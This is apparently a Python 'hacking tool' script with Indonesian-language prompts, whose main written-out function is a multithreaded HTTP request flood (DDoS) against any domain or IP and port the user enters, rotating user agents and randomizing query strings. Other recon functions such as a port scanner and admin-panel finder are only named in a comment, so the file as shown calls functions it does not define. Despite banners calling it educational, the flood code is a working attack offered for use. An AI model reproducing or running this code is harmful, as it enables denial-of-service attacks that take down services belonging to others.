import os
import sys
import time
import socket
import random
import threading
import subprocess
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from datetime import datetime
import dns.resolver

# ANSI color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def print_banner():
    clear_screen()
    banner = f"""
{Colors.RED}
 ██░ ██  ▄▄▄       ███▄    █   ▄████  ███▄ ▄███▓ ▄▄▄       ███▄    █ 
▓██░ ██▒▒████▄     ██ ▀█   █  ██▒ ▀█▒▓██▒▀█▀ ██▒▒████▄     ██ ▀█   █ 
▒██▀▀██░▒██  ▀█▄  ▓██  ▀█ ██▒▒██░▄▄▄░▓██    ▓██░▒██  ▀█▄  ▓██  ▀█ ██▒
░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█  ██▓▒██    ▒██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒
░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░░▒▓███▀▒▒██▒   ░██▒ ▓█   ▓██▒▒██░   ▓██░
 ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ 
 ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░  ░   ░ ░  ░      ░  ▒   ▒▒ ░░ ░░   ░ ▒░
 ░  ░░ ░  ░   ▒      ░   ░ ░ ░ ░   ░ ░      ░     ░   ▒      ░   ░ ░ 
 ░  ░  ░      ░  ░         ░       ░        ░         ░  ░         ░ 
{Colors.RESET}
{Colors.YELLOW}╔══════════════════════════════════════════════════════════╗
║{Colors.CYAN}           PYTHON HACKING TOOL v3.0 - EDUCATIONAL       {Colors.YELLOW}║
╚══════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
    print(banner)

# [Previous functions: print_menu(), information_gathering_menu(), whois_lookup(), 
# dns_lookup(), ip_geolocation(), subdomain_finder(), port_scanner(), 
# ping_sweep(), directory_brute_forcer(), website_info(), admin_panel_finder(), 
# about() - Keep all these functions exactly as they were before]

def resolve_dns(target):
    """Improved DNS resolution with fallback"""
    try:
        resolver = dns.resolver.Resolver()
        resolver.nameservers = ['8.8.8.8', '1.1.1.1']  # Google & Cloudflare DNS
        answer = resolver.resolve(target, 'A')
        return str(answer[0])
    except:
        try:
            return socket.gethostbyname(target)
        except socket.gaierror:
            return None

def ddos_web():
    """Enhanced DDoS function with better domain support"""
    clear_screen()
    print(f"{Colors.RED}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}         PERINGATAN: HANYA UNTUK EDUKASI          {Colors.RED}║")
    print(f"╠══════════════════════════════════════════════════════════╣")
    print(f"║ {Colors.YELLOW}1.{Colors.WHITE} Anda HARUS memiliki izin tertulis dari pemilik  {Colors.RED}║")
    print(f"║ {Colors.YELLOW}2.{Colors.WHITE} DDoS adalah aktivitas ILEGAL di banyak negara   {Colors.RED}║")
    print(f"║ {Colors.YELLOW}3.{Colors.WHITE} Ini hanya untuk pengujian sistem ANDA SENDIRI   {Colors.RED}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    confirm = input(f"\n{Colors.YELLOW}[?] Apakah Anda memahami dan setuju (y/N)? {Colors.RESET}").lower()
    if confirm != 'y':
        return
    
    target = input(f"{Colors.YELLOW}[?] Masukkan target (domain/IP): {Colors.RESET}").strip()
    port = int(input(f"{Colors.YELLOW}[?] Port target (default 80): {Colors.RESET}") or 80)
    threads = int(input(f"{Colors.YELLOW}[?] Jumlah thread (max 30): {Colors.RESET}") or 30)

    # Extract domain from URL if provided
    if '://' in target:
        domain = urlparse(target).netloc
    else:
        domain = target.split('/')[0].split(':')[0]

    # Resolve IP
    ip = resolve_dns(domain)
    if not ip:
        print(f"\n{Colors.RED}[!] Gagal resolve DNS untuk: {domain}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Kemungkinan penyebab:{Colors.RESET}")
        print("- Domain tidak terdaftar atau TLD (.xyz/.top) di-block")
        print("- Koneksi internet bermasalah")
        print(f"{Colors.YELLOW}[*] Coba gunakan IP langsung atau domain populer (.com/.net){Colors.RESET}")
        input("\n[*] Tekan Enter untuk kembali...")
        return

    print(f"\n{Colors.RED}[!] MEMULAI SERANGAN EDUKASI KE {domain} ({ip}:{port}){Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Gunakan Ctrl+C untuk menghentikan{Colors.RESET}")
    
    attack_num = 0
    running = True
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Mozilla/5.0 (Linux; Android 10; SM-A205U)',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X)'
    ]

    def attack():
        nonlocal attack_num
        while running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((ip, port))
                
                request = (
                    f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n"
                    f"Host: {domain}\r\n"
                    f"User-Agent: {random.choice(user_agents)}\r\n"
                    f"Accept: text/html,application/xhtml+xml\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                
                s.send(request.encode())
                attack_num += 1
                print(f"{Colors.RED}[+] Paket dikirim: {attack_num}{Colors.RESET}", end='\r')
                s.close()
                time.sleep(random.uniform(0.1, 0.5))
            except:
                try:
                    s.close()
                except:
                    pass

    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        thread_list.append(t)
        t.start()

    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        running = False
        print(f"\n{Colors.YELLOW}[!] Menghentikan serangan...{Colors.RESET}")
        for t in thread_list:
            t.join()
        print(f"{Colors.CYAN}[*] Total paket dikirim: {attack_num}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Tekan Enter untuk kembali ke menu...{Colors.RESET}")

def main():
    """Fungsi utama"""
    try:
        # Cek dependensi
        try:
            subprocess.run(['curl', '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(['ping', '-c', '1', '127.0.0.1'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Pastikan curl dan ping terinstall{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Jalankan: pkg install curl iputils-ping{Colors.RESET}")
            sys.exit(1)
            
        while True:
            print_banner()
            print_menu()
            choice = input(f"{Colors.YELLOW}[?] Pilih opsi (1-9): {Colors.RESET}")

            if choice == '1':
                information_gathering_menu()
            elif choice == '2':
                port_scanner()
            elif choice == '3':
                ping_sweep()
            elif choice == '4':
                directory_brute_forcer()
            elif choice == '5':
                website_info()
            elif choice == '6':
                admin_panel_finder()
            elif choice == '7':
                ddos_web()
            elif choice == '8':
                about()
            elif choice == '9':
                print(f"\n{Colors.GREEN}[+] Keluar dari program...{Colors.RESET}")
                time.sleep(1)
                sys.exit(0)
            else:
                print(f"\n{Colors.RED}[!] Pilihan tidak valid{Colors.RESET}")
                time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Program dihentikan oleh pengguna{Colors.RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()
